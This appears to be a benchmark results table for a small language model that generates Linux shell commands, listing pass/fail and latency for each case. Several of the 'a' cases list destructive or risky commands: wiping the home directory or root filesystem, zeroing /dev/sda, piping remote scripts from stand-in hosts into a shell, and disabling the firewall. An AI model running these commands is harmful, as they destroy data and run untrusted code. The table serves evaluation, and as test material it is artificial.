# eval: llama-server / qwen3-4b-instruct-2507.Q4_K_M.gguf (qwen3-4b-2507-linuxcmd)
- mode: plain · dataset core.jsonl#83828218eadbc7f7 · repeat 1
- pass: 58/72 (81%)
- cold p50 324ms p95 668ms · warm p50 0ms p95 0ms

| case | pass | cold ms | warm ms | commands |
| --- | --- | --- | --- | --- |
| u01 | ✓ | 296 | - | node -v && npm -v |
| u02 | ✓ | 208 | - | ls -lh |
| u03 | ✓ | 293 | - | curl -s ifconfig.me/ip |
| u04 | ✓ | 361 | - | lsof -i :3000 |
| u05 | ✓ | 195 | - | du -sh . |
| u06 | ✓ | 402 | - | find . -name "*.log" -mtime -1 |
| u07 | ✓ | 204 | - | ps aux | grep node |
| u08 | ✓ | 2268 | - | git status --porcelain | grep -E '^[ ]*M|A|D|D'| grep -v '^[ ]*D'| grep -v '^[ ] |
| u09 | ✓ | 206 | - | sudo pacman -S ripgrep |
| u10 | ✓ | 252 | - | mkdir projects && cd projects |
| u11 | ✓ | 343 | - | tar -czf archive.tar.gz folder/ |
| u12 | ✓ | 170 | - | echo $PATH |
| u13 | ✓ | 668 | - | lsof -i :8080 | awk '{print $2}' | xargs kill |
| u14 | ✓ | 322 | - | tail -20 /var/log/syslog |
| u15 | ✓ | 196 | - | python3 --version |
| u16 | ✓ | 214 | - | brew update && brew outdated |
| u17 | ✓ | 324 | - | echo $SHELL; echo $HOME |
| u18 | ✗ | 211 | - | git checkout HEAD~1 |
| u19 | ✗ | 642 | - | find ~ -type f -exec du -h {} + | sort -hr | head -5 |
| u20 | ✗ | 604 | - | pmap -x $(ps -o pid= -u $USER | tail -1) |
| u21 | ✓ | 205 | - | wc -l *.js |
| u22 | ✓ | 187 | - | sudo systemctl restart docker |
| u23 | ✓ | 318 | - | chmod +x script.sh && script.sh |
| u24 | ✓ | 271 | - | grep -r "TODO" . |
| u25 | ✓ | 487 | - | curl -L -o downloads/file.zip https://example.com/file.zip |
| u26 | ✗ | 668 | - | lscpu | grep -E "(model name|core(s) per socket|socket(s))" |
| u27 | ✓ | 450 | - | echo 'export FOO=bar' >> ~/.zshrc |
| u28 | ✓ | 528 | - | find . -name node_modules -type d -exec rm -rf {} + |
| u29 | ✓ | 491 | - | lsof -i -P -n -A | grep LISTEN |
| u30 | ✓ | 189 | - | unzip file.zip |
| u31 | ✓ | 487 | - | tail -f error.log | grep -E 'ERROR|error' |
| u32 | ✓ | 126 | - | uptime |
| u33 | ✓ | 661 | - | ls ~/.zshrc ~/.zprofile ~/.zlogin ~/.zlogout ~/.zprofile ~/.zshenv |
| u34 | ✓ | 359 | - | cat /etc/resolv.conf | grep nameserver |
| u35 | ✓ | 214 | - | cp file.txt backup.txt |
| u36 | ✓ | 232 | - | mv old.txt new.txt |
| u37 | ✓ | 219 | - | du -sh ~/Downloads |
| u38 | ✓ | 203 | - | npm ls -g |
| u39 | ✓ | 193 | - | xdg-open . |
| u40 | ✓ | 312 | - | sudo systemd-resolve --flush-caches |
| a01 | ✓ | 218 | - | rm -rf ~/* |
| a02 | ✓ | 565 | - | sudo dd if=/dev/zero of=/dev/sda bs=1M |
| a03 | ✗ | 217 | - | git push origin main --force |
| a04 | ✗ | 517 | - | curl -s https://sketchy.example.com/install.sh | zsh |
| a05 | ✗ | 348 | - | pkill -9 -f -u $USER |
| a06 | ✗ | 310 | - | chmod 777 /root/* |
| a07 | ✓ | 396 | - | echo "echo 'hello'" >> ~/.zshrc |
| a08 | ✓ | 454 | - | curl -L https://x.io/i | zsh |
| a09 | ✓ | 2189 | - | sudo chmod -R 755 /dev /proc /sys /tmp /var /etc /home /root /usr /opt /sbin /bi |
| a10 | ✓ | 384 | - | find /var/log -mtime +30 -delete |
| a11 | ✗ | 368 | - | echo "my_script.sh" >> ~/.cron |
| a12 | ✓ | 333 | - | git reset --hard HEAD~100 |
| a13 | ✓ | 272 | - | sudo apt-get purge nodejs npm |
| a14 | ✓ | 310 | - | sudo systemctl disable --now firewalld |
| a15 | ✓ | 423 | - | find /tmp -type f -mtime +1 -delete |
| a16 | ✓ | 437 | - | sudo find /tmp -type f -mtime +1 -delete |
| a17 | ✗ | 197 | - | rm -rf ~ |
| a18 | ✗ | 837 | - | gpg --cipher-algo AES256 --cipher-mode CBC --batch --yes --passphrase hunter2 -c |
| a19 | ✓ | 529 | - | echo 'export PATH="/usr/local/bin:$PATH"' >> ~/.zshrc |
| a20 | ✓ | 353 | - | sudo rm -rf / --no-preserve-root |
| u41 | ✗ | 563 | - | find ~ -size +100M -exec du -h {} \; |
| u42 | ✓ | 334 | - | echo 'hello world' > my notes.txt |
| u43 | ✓ | 275 | - | git log -5 --oneline |
| u44 | ✓ | 285 | - | curl -s https://example.com |
| u45 | ✓ | 280 | - | ls -1 | wc -l |
| u46 | ✓ | 355 | - | hostname -I | awk '{print $1}' |
| u47 | ✓ | 172 | - | df -h |
| u48 | ✓ | 125 | - | who |
| a21 | ✗ | 627 | - | echo "0 0 * * * rm -rf /tmp" | crontab - |
| a22 | ✓ | 377 | - | sudo ln -sf ~/.hosts /etc/hosts |
| a23 | ✓ | 195 | - | rm -f * |
| a24 | ✗ | 386 | - | curl https://x.io/i.sh | bash |
